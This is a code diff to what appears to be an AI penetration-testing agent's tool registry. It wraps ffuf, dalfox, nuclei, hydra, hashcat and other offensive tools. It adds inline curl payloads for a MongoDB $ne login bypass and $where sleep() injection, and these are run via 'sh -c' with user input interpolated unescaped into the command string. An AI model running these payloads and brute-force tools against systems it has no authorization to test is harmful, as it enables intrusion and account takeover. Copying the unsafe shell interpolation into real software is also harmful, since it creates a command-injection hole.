@@ -283,12 +283,14 @@ const ffuf = shellTool(
   {
     url: z.string().describe("Target URL with FUZZ keyword (e.g. https://target.com/FUZZ or https://target.com/api?FUZZ=1)"),
     wordlist: z.string().optional().default("/usr/share/wordlists/web/common.txt").describe("Wordlist path"),
+    // FIX: added PATCH, OPTIONS, HEAD to method enum
     method: z.enum(["GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS", "HEAD"]).optional().default("GET").describe("HTTP method"),
     headers: z.string().optional().describe("Custom headers (e.g. 'Authorization: Bearer TOKEN')"),
     data: z.string().optional().describe("POST body data with FUZZ keyword"),
     filter_code: z.string().optional().describe("Filter OUT these status codes (e.g. '404,403')"),
     match_code: z.string().optional().describe("Only show these status codes (e.g. '200,201,302')"),
     extensions: z.string().optional().describe("File extensions to append (e.g. '.php,.html,.json')"),
+    // FIX: rate param — correct ffuf flag is -rate-limit not -rate
     rate: z.number().optional().describe("Rate limit in requests per second"),
     threads: z.number().optional().default(40).describe("Number of threads"),
     timeout: z.number().optional().describe("Timeout in seconds"),
@@ -300,7 +302,8 @@ const ffuf = shellTool(
     if (args.filter_code) cmdArgs.push("-fc", args.filter_code);
     if (args.match_code) cmdArgs.push("-mc", args.match_code);
     if (args.extensions) cmdArgs.push("-e", args.extensions);
-    if (args.rate) cmdArgs.push("-rate", String(args.rate));
+    // FIX: was "-rate" — correct ffuf v2 flag is "-rate-limit"
+    if (args.rate) cmdArgs.push("-rate-limit", String(args.rate));
     return { cmd: "ffuf", cmdArgs };
   }
 );
@@ -314,14 +317,19 @@ const feroxbuster = shellTool(
     wordlist: z.string().optional().default("/usr/share/wordlists/web/directory-list-2.3-medium.txt").describe("Wordlist path"),
     depth: z.number().optional().default(3).describe("Recursion depth (0 = unlimited)"),
     extensions: z.string().optional().describe("Comma-separated extensions to search (e.g. 'php,html,json,js')"),
-    filter_status: z.string().optional().describe("Filter OUT these status codes (e.g. '404,403,302')"),
+    filter_status: z.string().optional().describe("Filter OUT these status codes as space-separated values (e.g. '404 403 302')"),
     threads: z.number().optional().default(50).describe("Number of threads"),
     timeout: z.number().optional().describe("Timeout in seconds"),
   },
   (args) => {
     const cmdArgs = ["-u", args.url, "-w", args.wordlist, "-d", String(args.depth), "-t", String(args.threads), "--silent"];
     if (args.extensions) cmdArgs.push("-x", args.extensions);
-    if (args.filter_status) cmdArgs.push("--filter-status", args.filter_status);
+    // FIX: feroxbuster --filter-status takes space-separated codes, push each separately
+    if (args.filter_status) {
+      args.filter_status.split(/[\s,]+/).forEach(code => {
+        if (code) cmdArgs.push("--filter-status", code);
+      });
+    }
     return { cmd: "feroxbuster", cmdArgs };
   }
 );
@@ -409,15 +417,17 @@ const dalfox = shellTool(
   "XSS Scanning",
   {
     target: z.string().describe("Target URL with parameters (e.g. https://target.com/search?q=test)"),
-    mode: z.enum(["url", "pipe", "file", "sxss"]).optional().default("url").describe("Scan mode: url (single), pipe (stdin), file (list), sxss (stored XSS)"),
-    blind_xss: z.string().optional().describe("Blind XSS callback URL (e.g. https://your-xss-hunter.com)"),
-    cookie: z.string().optional().describe("Cookie header for authenticated scanning"),
-    headers: z.string().optional().describe("Custom headers"),
-    skip_bav: z.boolean().optional().describe("Skip BAV (Basic Analysis and Validation) for speed"),
+    // FIX: dalfox subcommand comes before target, mode drives subcommand selection
+    mode: z.enum(["url", "pipe", "file", "sxss"]).optional().default("url").describe("Scan mode: url (single target), pipe (stdin list), file (url list file), sxss (stored XSS)"),
+    blind_xss: z.string().optional().describe("Blind XSS callback URL (e.g. https://your-xss-hunter.xss.ht)"),
+    cookie: z.string().optional().describe("Cookie header value for authenticated scanning (e.g. 'session=abc123')"),
+    headers: z.string().optional().describe("Custom request header (e.g. 'Authorization: Bearer TOKEN')"),
+    skip_bav: z.boolean().optional().describe("Skip BAV (Basic Analysis and Validation) phase for faster scanning"),
     timeout: z.number().optional().describe("Timeout in seconds"),
   },
   (args) => {
-    const cmdArgs = [args.mode, args.target, "--silence"];
+    // dalfox syntax: dalfox <mode> <target> [flags]
+    const cmdArgs = [args.mode || "url", args.target, "--silence"];
     if (args.blind_xss) cmdArgs.push("--blind", args.blind_xss);
     if (args.cookie) cmdArgs.push("--cookie", args.cookie);
     if (args.headers) cmdArgs.push("--header", args.headers);
@@ -436,7 +446,7 @@ const nuclei = shellTool(
   "Vuln Scanning",
   {
     target: z.string().describe("Target URL or file with URLs"),
-    templates: z.string().optional().describe("Specific template or directory"),
+    templates: z.string().optional().describe("Specific template path or directory"),
     severity: z.string().optional().describe("Filter by severity (e.g. 'critical,high')"),
     tags: z.string().optional().describe("Filter by tags (e.g. 'cve,rce,misconfig,takeover')"),
     rate_limit: z.number().optional().default(150).describe("Max requests per second"),
@@ -533,7 +543,7 @@ const sqlmap = shellTool(
 
 const ghauri = shellTool(
   "ghauri",
-  "Advanced SQL injection detection and exploitation — sqlmap alternative with better WAF bypass, error-based, time-based, boolean-based, and UNION-based techniques",
+  "Advanced SQL injection detection and exploitation — sqlmap alternative with better WAF bypass techniques (error-based, time-based, boolean-based, UNION-based)",
   "Exploitation",
   {
     url: z.string().describe("Target URL with parameter (e.g. http://target.com/page?id=1)"),
@@ -554,22 +564,45 @@ const ghauri = shellTool(
   }
 );
 
-const nosqlmap = shellTool(
-  "nosqlmap",
-  "NoSQL injection testing for MongoDB, CouchDB, Redis, and Cassandra. Tests authentication bypass, data extraction, and denial of service via NoSQL injection.",
-  "Exploitation",
-  {
-    url: z.string().describe("Target URL with parameter to test (e.g. http://target.com/login)"),
-    db_type: z.enum(["mongodb", "couchdb", "redis", "cassandra"]).optional().default("mongodb").describe("Target NoSQL database type"),
-    attack: z.enum(["auth_bypass", "extract", "dos"]).optional().default("auth_bypass").describe("Attack type: auth_bypass (login bypass), extract (data dump), dos (denial of service)"),
+// nosqlmap is fully menu-driven; this tool wraps it via run_command for non-interactive use.
+// For full interactive sessions use: sentinel run_command "python3 /opt/nosqlmap/nosqlmap.py"
+const nosqlmap = {
+  name: "nosqlmap",
+  description: "NoSQL injection testing for MongoDB, CouchDB, Redis, and Cassandra. Tests authentication bypass and data extraction. For full interactive sessions use run_command.",
+  category: "Exploitation",
+  schema: {
+    url: z.string().describe("Target URL (e.g. http://target.com/login)"),
+    test_type: z.enum(["auth_bypass", "js_injection", "timing"]).optional().default("auth_bypass").describe(
+      "Test type: auth_bypass (MongoDB $ne/$gt operator injection), js_injection (server-side JS injection), timing (blind timing-based)"
+    ),
+    field: z.string().optional().default("username").describe("Form field name to inject into (e.g. username, email, user)"),
     timeout: z.number().optional().describe("Timeout in seconds"),
   },
-  (args) => {
-    // nosqlmap is interactive by default; run with --attack flag and pipe answers
-    const cmdArgs = ["/opt/nosqlmap/nosqlmap.py", "--attack", args.attack, "--url", args.url, "--dbtype", args.db_type];
-    return { cmd: "python3", cmdArgs };
-  }
-);
+  execute: async (args) => {
+    // Build targeted curl-based NoSQL injection payloads for non-interactive testing
+    let payload;
+    if (args.test_type === "auth_bypass") {
+      // MongoDB operator injection — bypass login with $ne (not-equal) operator
+      payload = `curl -s -X POST '${args.url}' \
+        -H 'Content-Type: application/json' \
+        -d '{ "${args.field}": {"\\$ne": null}, "password": {"\\$ne": null} }' && \
+        echo '--- FORM ENCODED ---' && \
+        curl -s -X POST '${args.url}' \
+        -d '${args.field}[$ne]=invalid&password[$ne]=invalid'`;
+    } else if (args.test_type === "js_injection") {
+      // Server-side JavaScript injection via $where operator
+      payload = `curl -s -X POST '${args.url}' \
+        -H 'Content-Type: application/json' \
+        -d '{ "${args.field}": {"\\$where": "sleep(5000)"} }'`;
+    } else {
+      // Timing-based blind detection
+      payload = `curl -s -o /dev/null -w '%{time_total}' -X POST '${args.url}' \
+        -H 'Content-Type: application/json' \
+        -d '{ "${args.field}": {"\\$where": "sleep(3000)"} }'`;
+    }
+    return execTool("sh", ["-c", payload], { timeout: args.timeout || 30 });
+  },
+};
 
 const commix = shellTool(
   "commix",
@@ -649,9 +682,9 @@ const hydra = shellTool(
   {
     target: z.string().describe("Target host"),
     service: z.string().describe("Service to attack (e.g. ssh, ftp, http-post-form, mongodb)"),
-    username: z.string().optional().describe("Single username or username file path"),
-    password_list: z.string().optional().default("/usr/share/wordlists/passwords/rockyou-50k.txt").describe("Password wordlist"),
-    options: z.string().optional().describe("Additional options (e.g. form parameters)"),
+    username: z.string().optional().describe("Single username or path to username file"),
+    password_list: z.string().optional().default("/usr/share/wordlists/passwords/rockyou-50k.txt").describe("Password wordlist path"),
+    options: z.string().optional().describe("Additional hydra options (e.g. form parameters for http-post-form)"),
     timeout: z.number().optional().describe("Timeout in seconds"),
   },
   (args) => {
@@ -673,9 +706,9 @@ const hashcat = shellTool(
   "Password Cracking",
   {
     hash_file: z.string().describe("Path to file containing hashes"),
-    hash_type: z.number().default(0).describe("Hash type number (e.g. 0=MD5, 1000=NTLM)"),
+    hash_type: z.number().default(0).describe("Hash type number (e.g. 0=MD5, 1000=NTLM, 3200=bcrypt)"),
     wordlist: z.string().optional().default("/usr/share/wordlists/passwords/rockyou-50k.txt").describe("Wordlist path"),
-    rules: z.string().optional().describe("Rule file path"),
+    rules: z.string().optional().describe("Rule file path for mangling"),
     timeout: z.number().optional().describe("Timeout in seconds"),
   },
   (args) => {
@@ -692,7 +725,7 @@ const john = shellTool(
   {
     hash_file: z.string().describe("Path to file containing hashes"),
     wordlist: z.string().optional().default("/usr/share/wordlists/passwords/rockyou-50k.txt").describe("Wordlist path"),
-    format: z.string().optional().describe("Force hash format (e.g. raw-md5, ntlm)"),
+    format: z.string().optional().describe("Force hash format (e.g. raw-md5, ntlm, bcrypt)"),
     timeout: z.number().optional().describe("Timeout in seconds"),
   },
   (args) => {
